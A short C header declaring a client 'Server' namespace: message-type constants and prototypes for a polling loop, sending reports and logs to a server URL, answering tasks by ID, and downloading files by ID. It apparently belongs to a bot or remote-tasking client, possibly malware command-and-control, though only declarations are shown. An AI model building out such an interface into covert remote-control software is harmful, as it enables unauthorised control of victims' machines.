#ifndef _SERVER_H_
#define _SERVER_H_

namespace Server
{
#define SRV_TYPE_REPORT			33
#define SRV_TYPE_TASKANSWER		34
#define SRV_TYPE_LOADFILE		35
#define SRV_TYPE_LOG			36

	DWORD ServerLoopThread(PVOID Context);
	DWORD ProcessServerAnswer(PCHAR Buffer);

	BOOLEAN SendReport(PCHAR ServerUrl);
	PCHAR SendRequest(PCHAR ServerUrl, DWORD Type, PCHAR Request, DWORD Len, BOOLEAN Wait, PDWORD Size, PBOOLEAN pbok);
	
	VOID SendLogsToServer();
	VOID SendServerAnswer(DWORD TaskId, PCHAR ServerUrl, BOOLEAN Result, DWORD LastError);
	PVOID DownloadFileById(DWORD FileId, PCHAR ServerUrl, PDWORD pSize);	
};

#endif
